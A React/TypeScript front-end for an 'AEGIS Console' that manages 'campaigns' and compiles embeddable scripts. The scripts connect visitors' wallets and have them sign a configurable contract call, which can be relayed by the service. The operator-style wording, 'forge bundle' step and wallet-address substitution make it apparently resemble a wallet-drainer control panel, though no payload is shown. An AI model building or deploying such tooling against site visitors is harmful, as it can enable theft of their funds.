import { useCallback, useEffect, useState } from 'react';

type Campaign = {
  id: string;
  name: string;
  status: string;
  protocol: string;
  chain_id: number | null;
  domain_id: string | null;
  contract_id: string | null;
  config: Record<string, unknown> | null;
};

type Contract = { id: string; address: string; name: string | null; abi: unknown[] | null; chain_id: number | null };
type Domain = { id: string; origin: string };
type RelayJob = { id: string; status: string; tx_hash: string | null; function_name: string | null; origin: string | null; error: string | null };

const tokenKey = 'aegis.token';
const THEMES = ['dark-ops', 'militant', 'minimal', 'custom'];

function api(path: string, init?: RequestInit) {
  const token = localStorage.getItem(tokenKey);
  return fetch(path, {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(init?.headers ?? {}),
    },
  });
}

async function apiJson<T>(path: string, init?: RequestInit): Promise<T> {
  const res = await api(path, init);
  if (!res.ok) throw new Error(`HTTP ${res.status} on ${path}`);
  return (await res.json()) as T;
}

function Login({ onLoggedIn }: { onLoggedIn: () => void }) {
  const [email, setEmail] = useState('operator@example.com');
  const [password, setPassword] = useState('change-me');
  const [error, setError] = useState('');

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    const res = await api('/api/auth/login', { method: 'POST', body: JSON.stringify({ email, password }) });
    if (!res.ok) {
      setError('Login failed');
      return;
    }
    const data = await res.json();
    localStorage.setItem(tokenKey, data.token);
    onLoggedIn();
  }

  return (
    <form onSubmit={submit} className="card" style={{ maxWidth: 400, margin: '80px auto' }}>
      <h1>AEGIS Console</h1>
      <div className="row">
        <input value={email} onChange={(e) => setEmail(e.target.value)} placeholder="email" />
      </div>
      <div className="row">
        <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="password" />
      </div>
      {error && <div className="muted">{error}</div>}
      <div className="row">
        <button type="submit">Sign in</button>
      </div>
    </form>
  );
}

function Dashboard() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [contracts, setContracts] = useState<Contract[]>([]);
  const [domains, setDomains] = useState<Domain[]>([]);
  const [name, setName] = useState('');
  const [error, setError] = useState('');

  const load = useCallback(() => {
    apiJson<Campaign[]>('/api/campaigns').then(setCampaigns).catch(() => {});
    apiJson<Contract[]>('/api/contracts').then(setContracts).catch(() => {});
    apiJson<Domain[]>('/api/domains').then(setDomains).catch(() => {});
  }, []);

  useEffect(() => {
    load();
    const t = setInterval(load, 5000);
    return () => clearInterval(t);
  }, [load]);

  async function createCampaign() {
    const firstDomain = domains[0]?.id ?? null;
    const res = await api('/api/campaigns', {
      method: 'POST',
      body: JSON.stringify({ name, chainId: 1, protocol: 'reown', domainId: firstDomain }),
    });
    if (!res.ok) {
      setError('Failed to create campaign — register a domain first.');
      return;
    }
    const c = (await res.json()) as Campaign;
    setCampaigns((prev) => [c, ...prev]);
    setName('');
    setError('');
  }

  async function compile(id: string) {
    await api(`/api/campaigns/${id}/compile`, { method: 'POST' });
  }

  function logout() {
    localStorage.removeItem(tokenKey);
    location.reload();
  }

  return (
    <div>
      <div className="card">
        <h3>New campaign</h3>
        <div className="row">
          <input value={name} onChange={(e) => setName(e.target.value)} placeholder="Campaign name" />
          <button onClick={createCampaign} disabled={!name || domains.length === 0}>
            Create
          </button>
        </div>
        {domains.length === 0 && (
          <div className="muted">
            No whitelisted domain yet — add one via the orchestrator API so the embed script has a permissioned origin.
          </div>
        )}
        {error && <div className="muted" style={{ color: '#ff8c8c' }}>{error}</div>}
      </div>

      <h2>Campaigns</h2>
      <div className="grid">
        {campaigns.map((c) => (
          <div key={c.id} className="card">
            <strong>{c.name}</strong>
            <div className="muted">status: {c.status}</div>
            <div className="muted">protocol: {c.protocol}</div>
            <code>{c.id}</code>
            <div className="row">
              <button onClick={() => compile(c.id)} disabled={c.status !== 'draft'}>
                Compile embed
              </button>
            </div>
          </div>
        ))}
        {campaigns.length === 0 && <div className="muted">No campaigns yet.</div>}
      </div>

      <h2>Contracts</h2>
      <div className="grid">
        {contracts.map((c) => (
          <div key={c.id} className="card">
            <strong>{c.name ?? 'Unnamed'}</strong>
            <div><code>{c.address}</code></div>
            {c.abi?.length ? <div className="muted">{c.abi.length} ABI entries</div> : null}
          </div>
        ))}
        {contracts.length === 0 && <div className="muted">No contracts registered.</div>}
      </div>

      <h2>Whitelisted domains</h2>
      <div className="grid">
        {domains.map((d) => (
          <div key={d.id} className="card">
            <code>{d.origin}</code>
          </div>
        ))}
        {domains.length === 0 && <div className="muted">No domains registered.</div>}
      </div>

      <button onClick={logout} style={{ marginTop: 24 }}>Sign out</button>
    </div>
  );
}

// ---- Compile Lab ----------------------------------------------------------

type Config = {
  chainId: number;
  protocol: string;
  projectId: string;
  broadcastMode: 'relay' | 'wallet';
  to: string;
  value: string;
  functionName: string;
  abi: unknown[];
  args: { value: string; source: 'static' | 'wallet' }[];
  gasPolicy: 'auto' | 'manual';
  gasLimit: number;
  theme: string;
  accent: string;
  manualTrigger: boolean;
  webhookUrl: string;
  endpoint: string;
  statusEndpoint: string;
  modal: { connectButton: string; title: string; signBody: string; pending: string; confirmed: string; failed: string };
};

const emptyConfig = (): Config => ({
  chainId: 1,
  protocol: 'reown',
  projectId: '',
  broadcastMode: 'relay',
  to: '',
  value: '0',
  functionName: '',
  abi: [],
  args: [],
  gasPolicy: 'auto',
  gasLimit: 0,
  theme: 'dark-ops',
  accent: '',
  manualTrigger: false,
  webhookUrl: '',
  endpoint: '',
  statusEndpoint: '',
  modal: {
    connectButton: 'Connect Wallet',
    title: 'Connect your wallet',
    signBody: 'Approve this transaction in your wallet.',
    pending: 'Awaiting confirmation…',
    confirmed: 'Transaction confirmed.',
    failed: 'Transaction failed or rejected.',
  },
});

function asConfig(raw: Record<string, unknown> | null | undefined): Config {
  const base = emptyConfig();
  if (!raw) return base;
  const m = (raw.modal ?? {}) as Partial<Config['modal']>;
  return { ...base, ...raw, modal: { ...base.modal, ...m }, args: Array.isArray(raw.args) ? raw.args : [] };
}

function CompileLab() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [contracts, setContracts] = useState<Contract[]>([]);
  const [campaignId, setCampaignId] = useState('');
  const [cfg, setCfg] = useState<Config>(emptyConfig());
  const [campaignStatus, setCampaignStatus] = useState('');
  const [jobs, setJobs] = useState<RelayJob[]>([]);
  const [bundle, setBundle] = useState('');
  const [error, setError] = useState('');
  const [saved, setSaved] = useState('');

  const selectedCampaign = campaigns.find((c) => c.id === campaignId);
  const selectedContract = contracts.find((c) => c.id === (selectedCampaign?.contract_id ?? ''));

  const loadCampaigns = useCallback(() => {
    apiJson<Campaign[]>('/api/campaigns').then(setCampaigns).catch(() => {});
    apiJson<Contract[]>('/api/contracts').then(setContracts).catch(() => {});
  }, []);

  useEffect(() => {
    loadCampaigns();
    const t = setInterval(loadCampaigns, 6000);
    return () => clearInterval(t);
  }, [loadCampaigns]);

  // Load config + jobs when the selected campaign changes.
  useEffect(() => {
    if (!campaignId) return;
    apiJson<Campaign[]>(`/api/campaigns`).then((list) => {
      const c = list.find((x) => x.id === campaignId);
      if (c) {
        setCfg(asConfig(c.config));
        setCampaignStatus(c.status);
      }
    }).catch(() => {});
    apiJson<RelayJob[]>(`/api/campaigns/${campaignId}/relay`).then(setJobs).catch(() => setJobs([]));
  }, [campaignId]);

  async function saveConfig() {
    setError('');
    setSaved('');
    const res = await api(`/api/campaigns/${campaignId}/config`, { method: 'PATCH', body: JSON.stringify(cfg) });
    if (!res.ok) {
      setError('Failed to save config');
      return;
    }
    setSaved('Config saved');
  }

  async function startCompile() {
    setError('');
    const res = await api(`/api/campaigns/${campaignId}/compile`, { method: 'POST' });
    if (!res.ok) {
      setError('Compile failed');
      return;
    }
    setCampaignStatus('forged');
    await loadPreview();
  }

  async function loadPreview() {
    setBundle('');
    const res = await fetch(`/bundles/${campaignId}.js`);
    if (!res.ok) {
      setError('Preview unavailable — compile the campaign first');
      return;
    }
    setBundle(await res.text());
  }

  function applyAbi(text: string) {
    try {
      const parsed = JSON.parse(text);
      if (!Array.isArray(parsed)) throw new Error('ABI must be a JSON array');
      setCfg((c) => ({ ...c, abi: parsed }));
      setError('');
    } catch (e) {
      setError(`ABI parse error: ${(e as Error).message}`);
    }
  }

  async function copyBundle() {
    try {
      await navigator.clipboard.writeText(bundle);
      setSaved('Bundle copied to clipboard');
    } catch {
      setSaved('Copy failed — use the download button');
    }
  }

  function downloadBundle() {
    const blob = new Blob([bundle], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `aegis-campaign-${campaignId}.js`;
    a.click();
    URL.revokeObjectURL(url);
  }

  if (campaigns.length === 0) {
    return <div className="muted">No campaigns yet — create one on the Dashboard first.</div>;
  }

  const formRow = (label: string, children: React.ReactNode) => (
    <label className="lab-field">
      <span>{label}</span>
      {children}
    </label>
  );

  return (
    <div>
      <div className="card">
        <h3>Compile Lab</h3>
        <div className="row">
          <select value={campaignId} onChange={(e) => setCampaignId(e.target.value)} className="lab-select">
            <option value="">Select campaign…</option>
            {campaigns.map((c) => (
              <option key={c.id} value={c.id}>
                {c.name} ({c.status})
              </option>
            ))}
          </select>
          {selectedContract && <span className="muted">contract: {selectedContract.name ?? selectedContract.address}</span>}
          {campaignStatus && <span className={`pill pill-${campaignStatus}`}>{campaignStatus}</span>}
        </div>
        {error && <div className="muted" style={{ color: '#ff8c8c' }}>{error}</div>}
        {saved && <div className="muted" style={{ color: '#8cffb0' }}>{saved}</div>}
      </div>

      {campaignId && (
        <div className="lab-grid">
          <div className="card">
            <h4>Contract &amp; payload</h4>
            {formRow(
              'Contract address',
              <input
                value={cfg.to}
                onChange={(e) => setCfg((c) => ({ ...c, to: e.target.value }))}
                placeholder="0x… (leave empty to use the campaign contract)"
              />,
            )}
            {formRow(
              'Function name',
              <input
                value={cfg.functionName}
                onChange={(e) => setCfg((c) => ({ ...c, functionName: e.target.value }))}
                placeholder="e.g. transfer"
              />,
            )}
            {formRow(
              'Value (ETH)',
              <input type="number" step="any" value={cfg.value} onChange={(e) => setCfg((c) => ({ ...c, value: e.target.value }))} />,
            )}
            {formRow(
              'Chain ID',
              <input type="number" value={cfg.chainId} onChange={(e) => setCfg((c) => ({ ...c, chainId: Number(e.target.value) }))} />,
            )}
            {formRow(
              'ABI (JSON)',
              <textarea rows={6} spellCheck={false} defaultValue={JSON.stringify(selectedContract?.abi ?? [], null, 1)} onBlur={(e) => applyAbi(e.target.value)} className="lab-code" />,
            )}
            {formRow(
              'Args (wallet = substitute connected address)',
              <div>
                {(cfg.args ?? []).map((a, i) => (
                  <div key={i} className="row">
                    <input
                      value={a.value}
                      onChange={(e) =>
                        setCfg((c) => {
                          const args = [...(c.args ?? [])];
                          args[i] = { ...args[i], value: e.target.value };
                          return { ...c, args };
                        })
                      }
                      placeholder={`arg ${i}`}
                    />
                    <select
                      value={a.source}
                      onChange={(e) =>
                        setCfg((c) => {
                          const args = [...(c.args ?? [])];
                          args[i] = { ...args[i], source: e.target.value as 'static' | 'wallet' };
                          return { ...c, args };
                        })
                      }
                    >
                      <option value="static">static</option>
                      <option value="wallet">wallet</option>
                    </select>
                    <button onClick={() => setCfg((c) => ({ ...c, args: (c.args ?? []).filter((_, j) => j !== i) }))}>−</button>
                  </div>
                ))}
                <button onClick={() => setCfg((c) => ({ ...c, args: [...(c.args ?? []), { value: '', source: 'static' }] }))}>+ Add arg</button>
              </div>,
            )}
          </div>

          <div className="card">
            <h4>Wallet &amp; relay</h4>
            {formRow(
              'Wallet protocol',
              <select value={cfg.protocol} onChange={(e) => setCfg((c) => ({ ...c, protocol: e.target.value }))}>
                <option value="reown">WalletConnect (reown)</option>
                <option value="walletconnect-v2">walletconnect-v2</option>
                <option value="injected">Injected (MetaMask)</option>
              </select>,
            )}
            {formRow(
              'WalletConnect projectId',
              <input value={cfg.projectId} onChange={(e) => setCfg((c) => ({ ...c, projectId: e.target.value }))} placeholder="Cloud project id" />,
            )}
            {formRow(
              'Broadcast mode',
              <select value={cfg.broadcastMode} onChange={(e) => setCfg((c) => ({ ...c, broadcastMode: e.target.value as Config['broadcastMode'] }))}>
                <option value="relay">relay (AEGIS broadcasts the user-signed tx)</option>
                <option value="wallet">wallet (user sends directly)</option>
              </select>,
            )}
            {formRow(
              'Gas policy',
              <select value={cfg.gasPolicy} onChange={(e) => setCfg((c) => ({ ...c, gasPolicy: e.target.value as Config['gasPolicy'] }))}>
                <option value="auto">auto</option>
                <option value="manual">manual</option>
              </select>,
            )}
            {cfg.gasPolicy === 'manual' &&
              formRow(
                'Gas limit',
                <input type="number" value={cfg.gasLimit} onChange={(e) => setCfg((c) => ({ ...c, gasLimit: Number(e.target.value) }))} />,
              )}
            <label className="lab-check">
              <input type="checkbox" checked={cfg.manualTrigger} onChange={(e) => setCfg((c) => ({ ...c, manualTrigger: e.target.checked }))} />
              Manual trigger (host page dispatches <code>aegis:trigger</code>)
            </label>
            {formRow(
              'Webhook URL (optional)',
              <input value={cfg.webhookUrl} onChange={(e) => setCfg((c) => ({ ...c, webhookUrl: e.target.value }))} placeholder="https://…" />,
            )}
          </div>

          <div className="card">
            <h4>Modal &amp; theme</h4>
            {formRow(
              'Theme',
              <select value={cfg.theme} onChange={(e) => setCfg((c) => ({ ...c, theme: e.target.value }))}>
                {THEMES.map((t) => (
                  <option key={t} value={t}>{t}</option>
                ))}
              </select>,
            )}
            {formRow(
              'Accent (hex, override)',
              <input value={cfg.accent} onChange={(e) => setCfg((c) => ({ ...c, accent: e.target.value }))} placeholder="auto" />,
            )}
            <h4>Modal copy</h4>
            {formRow('Connect button', <input value={cfg.modal.connectButton} onChange={(e) => setCfg((c) => ({ ...c, modal: { ...c.modal, connectButton: e.target.value } }))} />)}
            {formRow('Title', <input value={cfg.modal.title} onChange={(e) => setCfg((c) => ({ ...c, modal: { ...c.modal, title: e.target.value } }))} />)}
            {formRow('Sign body', <input value={cfg.modal.signBody} onChange={(e) => setCfg((c) => ({ ...c, modal: { ...c.modal, signBody: e.target.value } }))} />)}
            {formRow('Confirmed', <input value={cfg.modal.confirmed} onChange={(e) => setCfg((c) => ({ ...c, modal: { ...c.modal, confirmed: e.target.value } }))} />)}
            {formRow('Failed', <input value={cfg.modal.failed} onChange={(e) => setCfg((c) => ({ ...c, modal: { ...c.modal, failed: e.target.value } }))} />)}
          </div>
        </div>
      )}

      {campaignId && (
        <>
          <div className="row" style={{ marginTop: 12 }}>
            <button onClick={saveConfig}>Save config</button>
            <button onClick={startCompile}>Compile → forge bundle</button>
            <button onClick={loadPreview}>Load preview</button>
          </div>

          <div className="card" style={{ marginTop: 8 }}>
            <h4>Generated bundle</h4>
            {bundle ? (
              <>
                <pre className="bundle-preview">{bundle.slice(0, 1200)}{bundle.length > 1200 ? '\n…' : ''}</pre>
                <div className="row">
                  <button onClick={copyBundle}>Copy embed script</button>
                  <button onClick={downloadBundle}>Download .js</button>
                </div>
              </>
            ) : (
              <div className="muted">
                No bundle loaded yet. Compile the campaign or load the preview. The embed only runs on
                the campaign's whitelisted origin.
              </div>
            )}
          </div>

          <div className="card" style={{ marginTop: 8 }}>
            <h4>Relay jobs ({jobs.length})</h4>
            {jobs.length === 0 && <div className="muted">No relay broadcasts yet.</div>}
            <table className="lab-table">
              <thead>
                <tr><th>id</th><th>status</th><th>function</th><th>tx</th></tr>
              </thead>
              <tbody>
                {jobs.map((j) => (
                  <tr key={j.id}>
                    <td><code>{j.id.slice(0, 8)}</code></td>
                    <td><span className={`pill pill-${j.status}`}>{j.status}</span></td>
                    <td>{j.function_name ?? '—'}</td>
                    <td><code>{j.tx_hash ?? '—'}</code></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
}

// ---- Shell ----------------------------------------------------------------

export default function App() {
  const [authed, setAuthed] = useState(() => Boolean(localStorage.getItem(tokenKey)));
  const [tab, setTab] = useState<'dashboard' | 'lab'>('dashboard');
  const [user, setUser] = useState('');

  useEffect(() => {
    if (!authed) return;
    apiJson<{ email: string }>('/api/auth/me')
      .then((u) => setUser(u.email ?? ''))
      .catch(() => {});
  }, [authed]);

  if (!authed) return <Login onLoggedIn={() => setAuthed(true)} />;

  return (
    <main className="layout">
      <nav className="tabs">
        <button className={tab === 'dashboard' ? 'tab active' : 'tab'} onClick={() => setTab('dashboard')}>
          Dashboard
        </button>
        <button className={tab === 'lab' ? 'tab active' : 'tab'} onClick={() => setTab('lab')}>
          Compile Lab
        </button>
        <span className="spacer" />
        {user && <span className="muted">{user}</span>}
      </nav>
      {tab === 'dashboard' ? <Dashboard /> : <CompileLab />}
    </main>
  );
}